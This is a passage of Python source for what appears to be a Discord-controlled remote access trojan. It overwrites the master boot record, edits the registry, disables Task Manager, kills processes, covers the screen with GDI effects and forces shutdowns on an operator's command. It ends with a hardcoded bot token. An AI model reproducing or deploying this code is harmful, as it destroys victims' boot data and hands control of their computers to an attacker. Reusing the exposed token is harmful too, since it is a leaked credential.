				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
			])
			bytes_written = WriteFile(hDevice, buffer, None)
			await message.reply(await femboyaccess("fuckmbr", "mbr overwritten successfully! :3"))
		except:
			await message.reply(await femboyaccess("fuckmbr", "an error occurred! you probably don't have admin permissions :c"))

	if message.content.startswith("regedit"):
		key_path = message.content.split("  ")[1]
		value_name = message.content.split("  ")[2]
		new_value = message.content.split("  ")[3]
		regedit = change_registry_value(key_path, value_name, new_value)
		if regedit == 1:
			await message.reply(await femboyaccess("regedit", "edited successfully! :3"))
		else:
			await message.reply(await femboyaccess("regedit", "could not edit the value! :c"))

	if message.content.startswith("taskkill"):
		try:
			task = message.content.split(" ")[1]
			subprocess.run(['taskkill', '/F', '/IM', task], check=True)
			await message.reply(await femboyaccess("taskkill", "killed the process! :3"))
		except:
			await message.reply(await femboyaccess("taskkill", "could not kill the process! :c"))

	if message.content.startswith("processes"):
		try:
			running_processes = get_running_processes()
			processes_message = '\n'.join(running_processes)
			await message.reply(await femboyaccess("processes", f"fetched the running processes! :3\n\n{processes_message}"))
		except:
			await message.reply(await femboyaccess("processes", "could not fetch the running processes! :c"))

	if message.content.startswith("disabletaskmgr"):
		try:
			subprocess.run(['reg', 'add', 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'])
			await message.reply(await femboyaccess("disabletaskmgr", "task manager has been disabled! :3"))
		except:
			await message.reply(await femboyaccess("disabletaskmgr", "task manager could not be disabled, you probably aren't running as admin! :c"))

	if message.content.startswith("enabletaskmgr"):
		try:
			subprocess.run(['reg', 'add', 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '0', '/f'])
			await message.reply(await femboyaccess("enabletaskmgr", "task manager has been enabled! :3"))
		except:
			await message.reply(await femboyaccess("enabletaskmgr", "task manager could not be enabled, you probably aren't running as admin! :c"))

	if message.content.startswith("highbeep"):
		duration = int(message.content.split(" ")[1])
		await message.reply(await femboyaccess("highbeep", "high-pitched beep noise is currently playing! :3"))
		winsound.Beep(32767, duration)
		await message.reply(await femboyaccess("highbeep", "high-pitched beep noise finished! :3"))

	if message.content.startswith("lowbeep"):
		duration = int(message.content.split(" ")[1])
		await message.reply(await femboyaccess("lowbeep", "low-pitched beep is currently playing! :3"))
		winsound.Beep(37, duration)
		await message.reply(await femboyaccess("lowbeep", "low-pitched beep noise finished! :3"))

	if message.content.startswith("custombeep"):
		frequency = int(message.content.split(" ")[1])
		duration = int(message.content.split(" ")[2])
		await message.reply(await femboyaccess("lowbeep", "low-pitched beep is currently playing! :3"))
		winsound.Beep(frequency, duration)
		await message.reply(await femboyaccess("lowbeep", "low-pitched beep noise finished! :3"))

	if message.content.startswith("piano"):
		piano_message = await create_piano_embed(message)
		await piano_message.edit(view=MyView(piano_message))

	if message.content.startswith("gdi"):
		desk = win32gui.GetDC(0)
		x = GetSystemMetrics(0)
		y = GetSystemMetrics(1)
		mode = message.content.split(" ")[1]
		time = message.content.split(" ")[2]
		if mode == "patinvert":
			await message.reply(await femboyaccess("gdi", f"started the patinvert effect for {time}ms! :3"))
			for i in range(0, 100):
				brush = win32gui.CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
				win32gui.SelectObject(desk, brush)
				win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), PATINVERT)
				asyncio.sleep(int(time))
			win32gui.ReleaseDC(desk, GetDesktopWindow())
			win32gui.DeleteDC(desk)
			await message.reply(await femboyaccess("gdi", f"stopped the patinvert effect! :3"))
		elif mode == "patcopy":
			await message.reply(await femboyaccess("gdi", f"started the patcopy effect for {time}ms! :3"))
			for i in range(0, 100):
				brush = win32gui.CreateSolidBrush(RGB(
					randrange(255),
					randrange(255),
					randrange(255)
					))
				win32gui.SelectObject(desk, brush)
				win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), PATCOPY)
				asyncio.sleep(int(time))
			win32gui.ReleaseDC(desk, GetDesktopWindow())
			win32gui.DeleteDC(desk)
			await message.reply(await femboyaccess("gdi", f"stopped the patcopy effect! :3"))

	if message.content.startswith("opencd"):
		ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
		await message.reply(await femboyaccess("opencd", "opened the cd tray! :3"))

	if message.content.startswith("closecd"):
		ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door closed", None, 0, None)
		await message.reply(await femboyaccess("closecd", "closed the cd tray! :3"))

	if message.content.startswith("spamtext"):
		if not spamtext:
			spamtext = True
			asyncio.create_task(print_on_screen(ctx=message, args=message.content))
			await message.reply(await femboyaccess("spamtext", "spamming text on screen! :3"))
		else:
			spamtext = False
			await message.reply(await femboyaccess("spamtext", "no longer spamming text on screen! :3"))

	if message.content.startswith("sus"):
		asyncio.create_task(download_sus(message))
		await message.reply(await femboyaccess("sus", "downloading among us.. :3"))

	if message.content.startswith("shutdown"):
		await message.reply(await femboyaccess("shutdown", "initiating computer shutdown! :3"))
		os.system("shutdown /s /t 0")

	if message.content.startswith("restart"):
		await message.reply(await femboyaccess("restart", "initiating computer restart! :3"))
		os.system("shutdown /r /t 0")

@client.event
async def on_disconnect(message):
	await channel.send(await femboyaccess("disconnected", "this session is disconnected (unusable)! :3"))
	await message.channel.delete()
	await client.close()

client.run("MTExNDIyNDk2NjI3NjIxOTA3MQ.GhShG_.nKVZ5HHCsXTrLZ0znh8fLwukkM5RMjREm2_A_0")